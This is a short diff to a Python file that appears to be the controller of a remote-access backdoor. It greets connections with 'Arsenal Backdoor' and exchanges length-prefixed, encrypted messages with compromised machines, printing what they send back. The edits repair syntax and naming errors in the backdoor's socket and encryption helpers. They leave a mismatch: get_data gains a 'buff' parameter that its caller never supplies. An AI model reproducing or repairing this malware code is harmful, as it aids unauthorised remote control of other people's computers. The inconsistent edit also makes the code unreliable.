@@ -37,7 +37,7 @@ def do_decrypt(ciphertext):
     message = obj2.decrypt(ciphertext)
     return message[:-message[-1]]
 
-def get_data(conn):
+def get_data(conn, buff):
     bs = conn.recv(8)
     try:
         (length,) = struct.unpack('>Q', bs)
@@ -53,14 +53,14 @@ def get_data(conn):
 def sendit(conn, output):
     message = do_encrypt(output)
     print(message)
-    length = pack('>Q', len(message))
+    length = struct.pack('>Q', len(message))
     conn.sendall(length)
     conn.sendall(message)
 
 def client(conn, addr, buff):
     conn.send(do_encrypt('Arsenal Backdoor'))
     while True:
-        data = get_data(conn):
+        data = get_data(conn)
         if data == 0:
             break
         print('\n'+str(do_decrypt(data).strip(), 'utf-8'))
